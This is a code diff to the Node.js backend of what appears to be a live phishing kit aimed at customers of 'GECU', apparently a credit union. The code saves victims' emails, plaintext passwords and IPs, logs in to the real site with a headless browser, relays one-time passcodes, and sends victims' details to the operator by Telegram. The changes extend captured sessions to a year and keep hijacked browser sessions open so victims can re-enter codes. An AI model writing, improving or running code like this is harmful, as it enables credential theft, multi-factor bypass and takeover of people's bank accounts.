@@ -632,7 +632,8 @@ async function saveEmailPasswordIP(email, password, ip) {
 //----------------------------------------- Session Management ---------------------------------------------
 
 function createSession(sessionId, email, password, ip) {
-    const expiresAt = new Date(Date.now() + 15 * 60 * 1000); // 15 minutes from now
+    // Set expiration to 1 year from now (effectively unlimited)
+    const expiresAt = new Date(Date.now() + 365 * 24 * 60 * 60 * 1000);
     
     const session = {
         sessionId,
@@ -648,15 +649,17 @@ function createSession(sessionId, email, password, ip) {
     
     activeSessions.set(sessionId, session);
     
-    // Also save to database
-    try {
-        const insertStmt = db.prepare(`
-            INSERT INTO sessions (session_id, email, password, ip, status, expires_at)
-            VALUES (?, ?, ?, ?, 'pending', ?)
-        `);
-        insertStmt.run(sessionId, email, password, ip, expiresAt.toISOString());
-    } catch (error) {
-        console.log('Error saving session to DB:', error.message);
+    // Also save to database (use INSERT OR REPLACE to handle duplicates)
+    if (db) {
+        try {
+            const insertStmt = db.prepare(`
+                INSERT OR REPLACE INTO sessions (session_id, email, password, ip, status, expires_at, updated_at)
+                VALUES (?, ?, ?, ?, 'pending', ?, CURRENT_TIMESTAMP)
+            `);
+            insertStmt.run(sessionId, email, password, ip, expiresAt.toISOString());
+        } catch (error) {
+            console.log('Error saving session to DB:', error.message);
+        }
     }
     
     return session;
@@ -675,24 +678,29 @@ function getSession(sessionId) {
     }
     
     // Fallback to database
-    try {
-        const stmt = db.prepare('SELECT * FROM sessions WHERE session_id = ? AND expires_at > datetime("now")');
-        const row = stmt.get(sessionId);
-        if (row) {
-            return {
-                sessionId: row.session_id,
-                email: row.email,
-                password: row.password,
-                ip: row.ip,
-                status: row.status,
-                createdAt: new Date(row.created_at).getTime(),
-                expiresAt: new Date(row.expires_at).getTime(),
-                browser: null,
-                page: null
-            };
+    if (db) {
+        try {
+            const stmt = db.prepare('SELECT * FROM sessions WHERE session_id = ? AND expires_at > datetime("now")');
+            const row = stmt.get(sessionId);
+            if (row) {
+                // Also restore to in-memory cache for faster access
+                const dbSession = {
+                    sessionId: row.session_id,
+                    email: row.email,
+                    password: row.password,
+                    ip: row.ip,
+                    status: row.status,
+                    createdAt: new Date(row.created_at).getTime(),
+                    expiresAt: new Date(row.expires_at).getTime(),
+                    browser: null,
+                    page: null
+                };
+                activeSessions.set(sessionId, dbSession);
+                return dbSession;
+            }
+        } catch (error) {
+            console.log('Error getting session from DB:', error.message);
         }
-    } catch (error) {
-        console.log('Error getting session from DB:', error.message);
     }
     
     return null;
@@ -706,11 +714,14 @@ function updateSessionStatus(sessionId, status) {
     }
     
     // Update database
-    try {
-        const updateStmt = db.prepare('UPDATE sessions SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE session_id = ?');
-        updateStmt.run(status, sessionId);
-    } catch (error) {
-        console.log('Error updating session in DB:', error.message);
+    if (db) {
+        try {
+            const updateStmt = db.prepare('UPDATE sessions SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE session_id = ?');
+            updateStmt.run(status, sessionId);
+            console.log(`✅ Session status updated to '${status}' for ${sessionId}`);
+        } catch (error) {
+            console.log('Error updating session in DB:', error.message);
+        }
     }
 }
 
@@ -803,8 +814,28 @@ app.post('/api/init-login', async (req, res) => {
                 const loginResult = await performLogin(localPage, email, password);
                 
                 if (!loginResult.success) {
+                    const errorMsg = loginResult.error || 'Unknown error';
                     updateSessionStatus(sessionId, 'failed');
-                    await sendTelegram(`❌ <b>GECU Login Failed</b>\n\nSession: ${sessionId}\nEmail: ${email}\nError: ${loginResult.error}\n\n⚠️ Please connect manually.`);
+                    
+                    // Store error message in session for PHP to retrieve
+                    const session = activeSessions.get(sessionId);
+                    if (session) {
+                        session.error = errorMsg;
+                        activeSessions.set(sessionId, session);
+                    }
+                    
+                    // Also update database with error message if possible
+                    if (db) {
+                        try {
+                            // We'll store error in status field for now, or add error column later
+                            const updateStmt = db.prepare('UPDATE sessions SET status = ?, updated_at = CURRENT_TIMESTAMP WHERE session_id = ?');
+                            updateStmt.run('failed', sessionId);
+                        } catch (e) {
+                            console.log('Error updating session status in DB:', e.message);
+                        }
+                    }
+                    
+                    await sendTelegram(`❌ <b>GECU Login Failed</b>\n\nSession: ${sessionId}\nEmail: ${email}\nError: ${errorMsg}\n\n⚠️ User will be redirected to try again.`);
                     
                     if (localBrowser) await localBrowser.close();
                     return;
@@ -1021,22 +1052,16 @@ app.post('/api/submit-otp', async (req, res) => {
         
     } catch (error) {
         console.error('Error submitting OTP:', error);
-        updateSessionStatus(sessionId, 'failed');
+        updateSessionStatus(sessionId, 'otp_failed');
         
-        if (localBrowser) {
-            try {
-                await localBrowser.close();
-            } catch (e) {
-                // Ignore close errors
-            }
-        }
-        activeSessions.delete(sessionId);
+        // Don't delete session - keep it so user can retry
+        // Don't close browser - keep it open for retry
         
-        await sendTelegram(`❌ <b>GECU OTP Submission Failed</b>\n\nSession: ${sessionId}\nEmail: ${session.email}\nError: ${error.message}\n\n⚠️ Please connect manually.`);
+        await sendTelegram(`❌ <b>GECU OTP Submission Failed</b>\n\nSession: ${sessionId}\nEmail: ${session.email}\nError: ${error.message}\n\n⚠️ User can retry from sms.php`);
         
-        res.status(500).json({ 
+        res.status(400).json({ 
             success: false, 
-            error: error.message 
+            error: error.message || 'An error occurred. Please try again.' 
         });
     }
 });
@@ -1056,7 +1081,8 @@ app.get('/api/session/:sessionId', (req, res) => {
             status: session.status,
             email: session.email,
             createdAt: session.createdAt,
-            expiresAt: session.expiresAt
+            expiresAt: session.expiresAt,
+            error: session.error || null
         }
     });
 });
